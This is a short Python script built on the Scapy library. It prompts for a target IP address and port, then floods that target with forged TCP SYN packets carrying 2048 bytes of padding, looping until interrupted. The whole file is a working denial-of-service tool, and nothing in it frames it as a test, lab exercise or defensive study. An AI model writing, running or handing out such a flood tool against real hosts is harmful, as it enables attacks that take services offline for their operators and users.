from scapy.all import *


def run():
    # target IP address
    target_ip = input("Enter target IP address: ")
    # the target port
    target_port = int(input("Enter target port: "))
    # forge IP packet with target ip as the destination ip
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    # data
    raw = Raw(b"X" * 2048)
    stack = ip / tcp / raw
    # loop untl CTRL+C is detected
    print("Use CTRL + C to exit the flood.")
    send(stack, loop=1, verbose=0)


if __name__ == "__main__":
    run()